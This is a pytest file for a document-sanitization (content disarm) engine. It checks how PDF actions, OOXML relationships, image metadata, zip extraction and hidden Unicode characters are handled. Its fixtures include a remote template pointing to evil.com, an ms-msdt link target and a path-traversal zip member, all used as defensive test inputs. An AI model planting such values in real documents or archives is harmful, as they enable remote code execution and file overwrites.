"""
Additional tests covering:
  - the two bugs found and fixed in this revision (nested-relationship crash,
    legacy .doc filename construction)
  - sanitize_pdf and sanitize_image, the two functions the original test
    file didn't cover at all, despite both being in the set actually wired
    into the Azure Function pipeline (see function_app.py's _run_cdr)
  - the new size/path guards added to the extraction paths

Run alongside the original test_cdr_engine.py, not as a replacement for it.
"""

import os
import shutil
import zipfile

import pytest
from PIL import Image
from pypdf import PdfWriter

from cdr_engine import (
    _safe_extractall,
    _scrub_ooxml_xml,
    convert_to_pdfa4,
    generate_cdr_provenance,
    sanitize_image,
    sanitize_legacy_doc,
    sanitize_pdf,
    sanitize_unicode_text,
    sanitize_zip_archive,
    strip_trailing_overlay,
    MAX_EXTRACTED_MEMBER_BYTES,
)


@pytest.fixture
def temp_files(tmp_path):
    return {
        "in_file": str(tmp_path / "dirty_payload.tmp"),
        "out_file": str(tmp_path / "clean_reconstructed.tmp"),
    }


# =====================================================================
# Regression: nested Relationship element used to crash _scrub_ooxml_xml
# =====================================================================
def test_scrub_ooxml_xml_removes_deeply_nested_malicious_relationship(tmp_path):
    xml_path = tmp_path / "workbook.xml.rels"
    xml_path.write_text(
        '<?xml version="1.0" encoding="UTF-8"?>'
        '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
        '<Wrapper><Relationship Id="rId1" Type="http://x" Target="oleObject1.bin"/></Wrapper>'
        '</Relationships>'
    )
    # Must not raise, and must actually remove the malicious relationship
    _scrub_ooxml_xml(str(xml_path))
    result = xml_path.read_text()
    assert "oleObject1.bin" not in result


# =====================================================================
# Regression: sanitize_legacy_doc filename construction
# =====================================================================
def test_legacy_doc_conversion_end_to_end(temp_files):
    """Requires a real libreoffice binary on PATH; this is the actual path
    that was broken before the fix (base_name was a tuple, not a string)."""
    input_doc = temp_files["in_file"] + ".doc"
    output_docx = temp_files["out_file"] + ".docx"

    # A .doc file LibreOffice can actually open: write a minimal RTF body
    # with a .doc extension, which soffice will happily convert.
    with open(input_doc, "w", encoding="ascii") as f:
        f.write(r"{\rtf1\ansi Hello CDR test}")

    result = sanitize_legacy_doc(input_doc, output_docx, timeout_seconds=60)
    assert result is True
    assert os.path.exists(output_docx)
    with zipfile.ZipFile(output_docx) as z:
        assert "word/document.xml" in z.namelist()


# =====================================================================
# sanitize_pdf: strips catalog-level active-content entries
# =====================================================================
def test_sanitize_pdf_strips_openaction_and_javascript(temp_files):
    input_pdf = temp_files["in_file"] + ".pdf"
    output_pdf = temp_files["out_file"] + ".pdf"

    writer = PdfWriter()
    writer.add_blank_page(width=200, height=200)
    # Simulate a malicious catalog entry an attacker might embed
    writer._root_object[__import__("pypdf.generic", fromlist=["NameObject"]).NameObject("/OpenAction")] = \
        __import__("pypdf.generic", fromlist=["NullObject"]).NullObject()
    with open(input_pdf, "wb") as f:
        writer.write(f)

    assert sanitize_pdf(input_pdf, output_pdf) is True

    from pypdf import PdfReader
    reader = PdfReader(output_pdf)
    assert "/OpenAction" not in reader.trailer["/Root"]


def test_sanitize_pdf_disarms_names_tree_and_page_actions(temp_files):
    input_pdf = temp_files["in_file"] + ".pdf"
    output_pdf = temp_files["out_file"] + ".pdf"

    from pypdf.generic import NameObject, DictionaryObject, TextStringObject

    writer = PdfWriter()
    page = writer.add_blank_page(width=200, height=200)

    # Inject page-level /AA (Additional Action on page open)
    page[NameObject("/AA")] = DictionaryObject({NameObject("/O"): DictionaryObject({NameObject("/S"): NameObject("/JavaScript")})})

    # Inject /Names -> /JavaScript catalog entry
    names_dict = DictionaryObject({
        NameObject("/JavaScript"): DictionaryObject({NameObject("/Names"): TextStringObject("evil_script")}),
        NameObject("/EmbeddedFiles"): DictionaryObject({NameObject("/Names"): TextStringObject("evil_exe")}),
    })
    writer._root_object[NameObject("/Names")] = names_dict

    with open(input_pdf, "wb") as f:
        writer.write(f)

    assert sanitize_pdf(input_pdf, output_pdf) is True

    from pypdf import PdfReader
    reader = PdfReader(output_pdf)
    root = reader.trailer["/Root"]
    if "/Names" in root:
        names = root["/Names"]
        assert "/JavaScript" not in names
        assert "/EmbeddedFiles" not in names
    # Verify page-level action was stripped
    assert "/AA" not in reader.pages[0]


def test_scrub_ooxml_removes_template_injection_and_dangerous_schemes(tmp_path):
    from cdr_engine import _scrub_ooxml_xml
    xml_path = tmp_path / "document.xml.rels"
    xml_path.write_text(
        '<?xml version="1.0" encoding="UTF-8"?>'
        '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
        '<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="http://evil.com/template.dotm" TargetMode="External"/>'
        '<Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="ms-msdt:/id=123"/>'
        '<Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image1.png"/>'
        '</Relationships>'
    )
    _scrub_ooxml_xml(str(xml_path))
    content = xml_path.read_text()
    # attachedTemplate must be removed completely
    assert "attachedTemplate" not in content
    # ms-msdt scheme must be blocked
    assert "http://localhost/blocked_by_cdr" in content
    # safe internal relative media reference preserved
    assert "media/image1.png" in content


# =====================================================================
# sanitize_image: strips EXIF/metadata rather than passing it through
# =====================================================================
def test_sanitize_image_strips_exif(temp_files):
    input_jpg = temp_files["in_file"] + ".jpg"
    output_jpg = temp_files["out_file"] + ".jpg"

    img = Image.new("RGB", (10, 10), color="red")
    exif = img.getexif()
    exif[0x010E] = "hidden description payload"  # ImageDescription tag
    img.save(input_jpg, exif=exif)

    # Confirm the EXIF was actually written into the input, so the test is meaningful
    assert Image.open(input_jpg).getexif().get(0x010E) == "hidden description payload"

    assert sanitize_image(input_jpg, output_jpg, "JPEG") is True

    result_exif = Image.open(output_jpg).getexif()
    assert 0x010E not in result_exif


# =====================================================================
# Extraction guards: reject unsafe member paths and oversized members
# =====================================================================
def test_safe_extractall_rejects_path_traversal_member(tmp_path):
    evil_zip = tmp_path / "evil.zip"
    with zipfile.ZipFile(evil_zip, "w") as z:
        z.writestr("../escape.txt", "should never be written outside target_dir")

    with zipfile.ZipFile(evil_zip) as z:
        with pytest.raises(ValueError):
            _safe_extractall(z, str(tmp_path / "extract_target"))


def test_safe_extractall_rejects_oversized_member(tmp_path):
    big_zip = tmp_path / "big.zip"
    with zipfile.ZipFile(big_zip, "w") as z:
        # ZipInfo lets us claim a file_size without actually writing that many bytes
        info = zipfile.ZipInfo("huge.bin")
        z.writestr(info, "x" * 100)  # tiny actual content
    # Patch the claimed size to exceed the cap and confirm the guard reads infolist() sizes
    with zipfile.ZipFile(big_zip, "a") as z:
        z.infolist()[0].file_size = MAX_EXTRACTED_MEMBER_BYTES + 1
        with pytest.raises(ValueError):
            _safe_extractall(z, str(tmp_path / "extract_target2"))


def test_zip_archive_recursion_depth_limit(tmp_path):
    """A zip nested deeper than MAX_ZIP_RECURSION_DEPTH should be rejected,
    not recursed into indefinitely."""
    from cdr_engine import MAX_ZIP_RECURSION_DEPTH

    input_zip = str(tmp_path / "deep.zip")
    output_zip = str(tmp_path / "deep_out.zip")
    with zipfile.ZipFile(input_zip, "w") as z:
        z.writestr("note.txt", "hello")

    # Calling directly at a depth already at the limit should refuse immediately
    assert sanitize_zip_archive(input_zip, output_zip, _depth=MAX_ZIP_RECURSION_DEPTH) is False


# =====================================================================
# Advanced CDR Features: Overlay Stripping, Unicode Sanitization, PDF/A-4
# =====================================================================
def test_strip_trailing_overlay_pdf(tmp_path):
    pdf_path = tmp_path / "test_overlay.pdf"
    # Create valid minimal PDF with appended malicious overlay
    valid_pdf = b"%PDF-1.4\n1 0 obj\n<<>>\nendobj\ntrailer\n<<>>\n%%EOF\r\n"
    malicious_overlay = b"EVIL_APPENDED_PAYLOAD_EXE_OR_ZIP_DATA"
    pdf_path.write_bytes(valid_pdf + malicious_overlay)

    assert strip_trailing_overlay(str(pdf_path)) is True
    cleaned_bytes = pdf_path.read_bytes()
    assert b"EVIL_APPENDED_PAYLOAD" not in cleaned_bytes
    assert cleaned_bytes.endswith(b"%%EOF\r\n") or cleaned_bytes.endswith(b"%%EOF")


def test_sanitize_unicode_text_strips_invisible_and_overrides():
    # Invisible zero-width space (\u200B) and directional override (\u202E)
    poisoned_text = "Ad\u200Bmin\u202Ecod"
    cleaned = sanitize_unicode_text(poisoned_text)
    assert "\u200B" not in cleaned
    assert "\u202E" not in cleaned
    assert "Admin" in cleaned


def test_convert_to_pdfa4_normalization(temp_files):
    input_pdf = temp_files["in_file"] + ".pdf"
    output_pdf = temp_files["out_file"] + ".pdf"

    writer = PdfWriter()
    writer.add_blank_page(width=200, height=200)
    with open(input_pdf, "wb") as f:
        writer.write(f)

    # Convert to PDF/A-4
    assert convert_to_pdfa4(input_pdf, output_pdf) is True
    assert os.path.exists(output_pdf)
    assert os.path.getsize(output_pdf) > 0

    from pypdf import PdfReader
    reader = PdfReader(output_pdf)
    root = reader.trailer["/Root"]
    # Verify PDF/A OutputIntent tag exists
    assert "/OutputIntents" in root


def test_generate_cdr_provenance(temp_files):
    input_file = temp_files["in_file"] + ".txt"
    output_file = temp_files["out_file"] + ".txt"

    with open(input_file, "w") as f:
        f.write("Input content")
    with open(output_file, "w") as f:
        f.write("Sanitized content")

    prov = generate_cdr_provenance(input_file, output_file, actions_taken=["disarm_scripts", "pdfa4_normalization"])
    assert prov["input_file"] == os.path.basename(input_file)
    assert prov["output_file"] == os.path.basename(output_file)
    assert prov["input_sha256"] is not None
    assert prov["output_sha256"] is not None
    assert "pdfa4_normalization" in prov["actions"]
